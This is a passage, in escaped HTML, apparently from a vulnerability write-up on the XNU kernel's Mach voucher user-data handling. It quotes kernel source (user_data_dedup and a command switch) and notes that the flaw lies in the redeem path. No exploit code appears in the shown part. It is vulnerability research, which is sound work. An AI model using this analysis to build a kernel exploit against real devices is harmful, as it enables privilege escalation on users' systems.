 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;USER_DATA_MAX_DATA &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_RESOURCE_SHORTAGE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* empty is the default */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;out_value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;user_data_dedup&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;out_value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_value_handle_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* every other command is unknown */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_INVALID_ARGUMENT&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Let&amp;#39;s look at the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span&gt;&amp;nbsp;case, which is the command we put in our single sub-recipe. (The vulnerability is in the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;code above but we need a lot more background before we get to that.) In the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span&gt;&amp;nbsp;case the input arbitrary byte buffer is passed to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_dedup&lt;/span&gt;&lt;span&gt;, then that return value is returned as the value of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;out_value&lt;/span&gt;&lt;span&gt;. Here&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_dedup&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.7bb6adaf52c18b6e3e2890205d992e9ab2854f2f&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.28&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;user_data_element_t&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;user_data_dedup&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t sum&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t hash&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_element_t elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_element_t alloc &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sum &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;user_data_checksum&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hash &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;USER_DATA_HASH_BUCKET&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;retry&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_lock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;();&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queue_iterate&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;user_data_bucket&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;user_data_element_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;e_hash_link&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_hash &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;hash&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* if sums match... */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_sum &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;sum &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_size &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t i&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* and all data matches */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;i &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;++)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_data&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
